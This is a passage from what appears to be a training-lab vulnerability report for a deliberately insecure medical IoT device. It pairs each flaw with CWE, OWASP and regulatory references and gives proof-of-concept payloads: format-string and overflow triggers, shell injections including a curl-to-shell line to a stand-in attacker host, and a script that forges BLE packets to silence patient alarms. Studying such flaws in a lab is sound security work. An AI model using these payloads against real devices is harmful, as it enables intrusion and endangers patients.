} else if (pid > 0) {
    /* FLAW: no waitpid() — child becomes zombie */
    send(c_fd, "SVC_RESTART_QUEUED", 18, 0);
}
```

Each restart request leaves an entry in the process table that is never reaped. Under sustained use or automated testing, this exhausts the system's process table, leading to denial of service on an embedded device with limited resources.

**References:** OWASP IoT Top 10 — I8 · CWE-404 — Improper Resource Shutdown or Release

---

### IoT:I9 — Insecure Default Settings

#### 9.1 Format string vulnerability in VERIFY_STATUS (cmd `0x05`)

The diagnostic command passes the payload directly as the format string argument to `snprintf`:

```c
/* careservice.c:154 */
char report_header[128];
snprintf(report_header, 128, module_name);   /* ← FORMAT STRING */
```

An attacker can send a payload containing format specifiers to read stack memory (`%x`, `%s`) or write to arbitrary addresses (`%n`):

```python
# Read stack values
igp(0x05, b'%x.%x.%x.%x.%x')
# → "1f4.400.0.bffffea8.474f4154..."

# Read stack values — second sink (cmd 0x0B DEFIBRILLATE)
igp(0x02, b'OtterMobile2026')
igp(0x0B, b'%x.%x.%x.%x')
# → Written to /opt/careotter_events.log
```

Note: `0x05` does not require authentication. `0x0B` requires authentication but has a second independent format string sink in the events log write path.

**References:** OWASP IoT Top 10 — I9 · CWE-134 — Use of Externally-Controlled Format String

---

#### 9.2 Integer underflow in SET_PREFS TLV parser (cmd `0x04`)

`parse_preferences()` uses a `uint16_t remaining` counter that can underflow when a TLV length field exceeds the number of bytes left in the buffer:

```c
uint8_t t_len = data[cursor++];
remaining -= 2;                     /* underflow possible here */
if (t_len <= remaining) {
    memcpy(local_store, &data[cursor], t_len);  /* BOF if t_len > 128 */
```

Sending a TLV with `Type=0xAA, Len=0xFF` followed by only 4 bytes of value causes `remaining` to underflow and the subsequent `memcpy` to write beyond the 128-byte `local_store` stack buffer.

```python
igp(0x02, b'OtterMobile2026')
payload = bytes([0xAA, 0xFF]) + b'A' * 4   # len=255, only 4 bytes provided
igp(0x04, payload)
```

**References:** OWASP IoT Top 10 — I9 · CWE-191 — Integer Underflow · CWE-121 — Stack-based Buffer Overflow

---

#### 9.3 Shell injection in SET_WIFI (cmd `0x06`)

The SSID and PSK fields from the payload are interpolated directly into a shell command passed to `system()` without escaping shell metacharacters:

```c
snprintf(cmd, sizeof(cmd),
         "uci set wireless.@wifi-iface[0].ssid='%s' && "
         "uci set wireless.@wifi-iface[0].key='%s' && "
         "uci commit wireless && wifi reload",
         ssid, psk);
system(cmd);
```

An SSID value such as `'; reboot #` or `' && curl http://attacker/shell.sh | sh #` causes arbitrary command execution with the privileges of `careservice` (root):

```python
igp(0x02, b'OtterMobile2026')
# Inject via SSID field
igp(0x06, b"' && reboot #|validpassword123")
```

**References:** OWASP IoT Top 10 — I9 · CWE-78 — Improper Neutralization of Special Elements used in an OS Command

---

#### 9.4 Command injection in EMERGENCY_ALERT (cmd `0x0C`)

The alert message payload is embedded directly into a `curl` shell invocation:

```c
snprintf(cmd, sizeof(cmd),
         "curl -s -X POST '%s' -d 'msg=%s' > /dev/null 2>&1",
         url, (char*)payload);
system(cmd);
```

Payload `test'; reboot #` breaks out of the `curl` argument and executes arbitrary commands:

```python
igp(0x02, b'OtterMobile2026')
igp(0x0C, b"normal'; touch /tmp/pwned #")
```

**References:** CWE-78 · OWASP IoT Top 10 — I9

---

#### 9.5 BLE threshold write without authentication (CSCP v1)

The GATT characteristic `0xFF01` accepts `WriteValue` calls from any connected BLE client without any session-level authentication. The CSCP v1 "encryption" (AES-128-ECB with hardcoded key) provides no authentication guarantee — it only acts as a serialization format. An attacker who extracts the key writes arbitrary threshold values:

```python
from Crypto.Cipher import AES
import struct, zlib

KEY    = b"careotter-key-16"
MAGIC  = 0xCAFE0DDA

def cscp_pack(bpm_min, bpm_max, spo2_min):
    plaintext = struct.pack("BBB", bpm_min, bpm_max, spo2_min) + b'\x00' * 13
    crc = zlib.crc32(plaintext) & 0xFFFFFFFF
    ct  = AES.new(KEY, AES.MODE_ECB).encrypt(plaintext)
    return struct.pack(">II", MAGIC, crc) + ct

# Silence all alerts
pkt = cscp_pack(0, 255, 0)
# Write to characteristic 0xFF01 via nRF Connect or bleak
```

**References:** OWASP Mobile M3 — Insecure Authentication · CWE-306

---

## Attack Chains

All attack chains are documented as step-by-step playbooks with concrete commands in [`Attack_Playbook.md`](../Attack_Playbook.md). The table below serves as an index.

| Chain | Vector | Physical Access | Key Vulns | Playbook |
|-------|--------|-----------------|-----------|----------|
| **A** | IGP v4 (TCP :9999) | No | Hardcoded token (I1), Command injection (I9.1) | [Link ↗](../Attack_Playbook.md#chain-a--remote-code-execution-via-network) |
| **B** | BLE GATT | BLE range (~10–30 m) | ManufacturerData leak (I3), Hardcoded CSCP key (M1) | [Link ↗](../Attack_Playbook.md#chain-b--patient-safety-attack-via-ble) |
| **C** | IGP v4 or HTTP | No | PSK plaintext disclosure (I6) | [Link ↗](../Attack_Playbook.md#chain-c--wifi-credential-theft) |
| **D** | IGP v4 | No | Format string (I9.2) | [Link ↗](../Attack_Playbook.md#chain-d--stack-disclosure-via-format-string) |
| **E** | BLE GATT (provisioning) | BLE range | Hidden service (P1), No pairing (P2), Hardcoded PIN (P3), Shell injection (P4), SSRF (P6), Factory reset (P7) | [Link ↗](../Attack_Playbook.md#chain-e--full-device-compromise-from-ble-proximity) |
| **F** | BLE GATT + HTTP | BLE range + network | P1, P2, P3, P4, P6, Hardcoded signature | [Link ↗](../Attack_Playbook.md#chain-f--cloud-api-impersonation-via-signature-interception) |

---

## Regulatory Context

Medical IoT devices are subject to specific regulatory frameworks. The vulnerabilities present in CareOtter map to requirements that real devices must meet:

| Vulnerability | Relevant Standard | Requirement violated |
|--------------|------------------|---------------------|
| Hardcoded token | IEC 62443-3-3 SR 1.5 | Authenticator management |
| No transport encryption | FDA Cybersecurity Guidance 2023 | Data integrity in transit |
| Unauthenticated threshold write | IEC 62601 / ISO 14971 | Risk management — safety function protection |
| Global auth state | ETSI EN 303 645 §5.5 | Session management |
| PSK disclosure | GDPR Art. 32 | Security of processing |
| Format string / command injection | IEC 62443-4-1 | Secure coding requirements |
| Hidden provisioning backdoor | IEC 62443-3-3 SR 1.1 | Identification and authentication control |
| Hardcoded factory PIN | IEC 62443-3-3 SR 1.5 | Authenticator management |
| BLE shell injection / SSRF | IEC 62443-4-1 | Secure coding — input validation |
| Provisioning channel never expires | ETSI EN 303 645 §5.4 | Secure software development lifecycle |

---

## Quick Reference

For concrete commands, payloads, and one-liners for every attack surface, see [`Attack_Playbook.md`](../Attack_Playbook.md#quick-reference--one-liners).
